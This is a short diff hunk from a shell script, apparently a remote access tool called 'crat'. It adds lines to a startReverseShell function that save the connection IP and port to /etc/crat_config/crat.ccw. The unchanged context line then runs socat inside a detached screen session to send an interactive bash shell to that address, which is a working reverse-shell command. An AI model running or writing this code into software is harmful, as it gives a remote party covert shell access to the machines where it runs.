@@ -93,6 +93,11 @@ startReverseShell () {
       fi
     fi
 
+    # check if ip and port are set if they are save them to /etc/crat_config/crat.ccw
+    if [ ! -z "$ip" ] && [ ! -z "$port" ]; then
+      echo "$ip:$port" > /etc/crat_config/crat.ccw
+    fi
+
     screen -dmS screen_service /bin/bash -c "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port"
   done
 }
